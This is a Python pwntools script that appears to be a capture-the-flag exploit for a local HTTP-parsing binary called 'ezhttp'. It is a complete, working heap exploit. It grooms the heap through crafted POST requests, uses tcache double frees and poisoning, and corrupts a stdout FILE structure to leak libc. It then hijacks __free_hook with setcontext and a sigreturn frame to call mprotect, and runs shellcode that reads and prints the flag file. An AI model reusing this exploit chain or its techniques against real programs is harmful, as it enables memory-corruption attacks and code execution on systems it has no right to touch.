#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# gdb.attach(p, 'b *$rebase(0x1904)\n')

def gen_payload(payload):
  return 'POST /%s HTTP/1.1\r\nCookie: user=admin\r\ntoken: \r\n\r\n'%(payload)

def add(content):
  payload = gen_payload('create') + 'content=' + content
  p.sendlineafter('======= Send Http packet to me: =======', payload)

def delete(idx):
  payload = gen_payload('del') + 'index=' + str(idx) 
  p.sendlineafter('======= Send Http packet to me: =======', payload)

def edit(idx, content):
  payload = gen_payload('edit') + 'index=' + str(idx) + '&content=' + content
  p.sendlineafter('======= Send Http packet to me: =======', payload)
 
if __name__ == "__main__":
  for i in range(20):
    try :  
      p = process('./ezhttp')
      libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
      add('a' * 0x28) #0
      p.recvuntil('Your gift: ')
      heapbase = eval(p.recv(14))  - 0x260
      add('a' * 0x100)#1
      add('a' * 0x100)#2
      add('Mech0n12')#3

      delete(0)
      delete(0)
      delete(0)
      for i in range(7):
        delete(1)
      add('a' * 0x100)#4 == 6
      delete(1)
      delete(1)
      
      add('a' * 0x28)#5 == 0
      edit(5, p64(heapbase + 0x290))

      # edit(4, '\x60\x07\xdd')
      edit(4, '\x60\x97')

      add('a' * 0x28)#6
      add('a' * 0x28)#7
      # gdb.attach(p, 'b *$rebase(0x1712)\n')
      add(p64(0x61616161fbad1887)+"a"*0x20)#8
      edit(8, p64(0xfbad1800) + p64(0)*3 + '\x00')
      libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ed8b0
      success('LEAK: ' + str(hex(libc.address)))
      pause()
      
      free_hook = libc.sym['__free_hook']
      set_context = libc.symbols['setcontext']
      new_addr = free_hook & 0xfffffffffffff000

      frame = SigreturnFrame()
      frame.rsp = free_hook + 0x10
      frame.rdi = new_addr
      frame.rsi = 0x1000
      frame.rdx = 7
      frame.rip = libc.sym['mprotect']
      shellcode1 = '''
      xor rdi, rdi
      mov rsi, %d
      mov rdx, 0x1000
      mov rax, 0
      syscall

      jmp rsi
      ''' % new_addr

      edit(2, str(frame))
      edit(7, p64(heapbase + 0x290))
      add('a' * 0x100)  #9
      edit(9, p64(free_hook))

      
      payload = p64(set_context + 53) + p64(free_hook + 0x18) * 2 + asm(shellcode1) + '\n'
      add('a' * 0x100) #10
      add('a' * 0x100) #11
      edit(11, payload)
      delete(2)

      shellcode2 = '''
      xor rdi, rdi
      mov rdi, 0x67616c662f
      push rdi
      mov rdi, rsp
      xor rsi, rsi
      xor rdx, rdx
      mov rax, 2
      syscall

      mov rdi, rax
      mov rsi, rsp
      mov rdx, 0x50
      mov rax, 0
      syscall

      mov rdi, 1
      mov rsi, rsp
      mov rdx, rax
      mov rax, 1
      syscall

      mov rdi, 0
      mov rax, 60
      syscall
      '''
      p.sendline(asm(shellcode2))

      success('LEAK: ' + str(hex(libc.address)))
      success('HEAP: ' + str(hex(heapbase)))
      # gdb.attach(p)
      p.interactive()
    except :
      p.close()